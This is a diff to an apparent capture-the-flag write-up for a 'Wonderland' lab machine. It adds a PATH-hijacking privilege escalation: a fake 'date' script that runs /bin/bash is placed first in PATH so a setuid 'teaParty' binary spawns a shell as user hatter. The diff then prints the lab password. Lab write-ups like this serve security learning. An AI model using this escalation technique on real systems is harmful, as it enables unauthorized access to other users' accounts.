@@ -358,6 +358,32 @@ puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
 +++ exited (status 33) +++
 ```
 
-Hmm, custom date? setuid of hatter is 1003 though. Not sure what is up but let's try custom date only.
+Hmm, custom date? setuid of hatter is 1003 though. Not sure what is up but let's try custom date variable only.
 
+```bash
+rabbit@wonderland:/home/rabbit$ nano date
+Unable to create directory /home/alice/.local/share/nano/: Permission denied
+It is required for saving/loading search history or cursor positions.
 
+Press Enter to continue
+
+rabbit@wonderland:/home/rabbit$ cat date
+#!/bin/bash
+/bin/bash
+rabbit@wonderland:/home/rabbit$ chmod +x date
+rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
+rabbit@wonderland:/home/rabbit$ ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:/home/rabbit$ whoami
+hatter
+```
+
+Noice
+
+```bash
+hatter@wonderland:/home/hatter$ ls
+password.txt
+hatter@wonderland:/home/hatter$ cat password.txt
+WhyIsARavenLikeAWritingDesk?
+```
